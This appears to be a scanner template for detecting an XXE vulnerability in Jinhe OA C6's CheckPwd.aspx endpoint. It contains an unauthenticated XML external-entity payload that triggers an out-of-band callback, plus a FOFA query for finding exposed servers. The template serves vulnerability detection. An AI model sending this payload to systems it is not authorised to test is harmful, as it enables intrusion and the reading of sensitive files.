id: jinhe-oa-checkwwd-xxe

info:
  name: 金和OA CheckPwd.aspx XXE漏洞
  author: AVIC123
  severity: high
  verified: true
  description: |-
    金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 CheckPwd.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
    fofa: app="金和网络-金和OA"
  reference:
    - https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html
  tags: jinhe,oa,XXE
  created: 2025/08/20

set:
  oob: oob()
  oobHTTP: oob.HTTP
  hostname: request.url.host

rules:
  r0:
    request:
      method: POST
      path: /c6/Jhsoft.Web.workflat/CheckPwd.aspx/
      headers:
        Content-Type: application/xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "{{oobHTTP}}/xxe_test">
        %remote;]>
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)

expression: r0()
